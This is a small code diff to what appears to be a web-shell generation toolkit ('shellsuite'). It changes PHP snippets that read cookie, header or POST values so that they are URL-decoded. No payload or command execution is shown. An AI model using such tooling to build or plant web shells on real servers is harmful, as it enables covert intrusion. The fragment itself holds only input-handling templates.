@@ -11,12 +11,12 @@ from __future__ import annotations
 from shellsuite.protocol import contract
 
 _READERS: dict[str, str] = {
-    "cookie": '{var} = isset($_COOKIE["{name}"]) ? $_COOKIE["{name}"] : "";',
+    "cookie": '{var} = isset($_COOKIE["{name}"]) ? urldecode($_COOKIE["{name}"]) : "";',
     "header": (
         '$__ss_key = "HTTP_" . strtoupper(str_replace("-", "_", "{name}"));\n'
-        '{var} = isset($_SERVER[$__ss_key]) ? $_SERVER[$__ss_key] : "";'
+        '{var} = isset($_SERVER[$__ss_key]) ? urldecode($_SERVER[$__ss_key]) : "";'
     ),
-    "post": '{var} = isset($_POST["{name}"]) ? $_POST["{name}"] : "";',
+    "post": '{var} = isset($_POST["{name}"]) ? urldecode($_POST["{name}"]) : "";',
 }
 
 
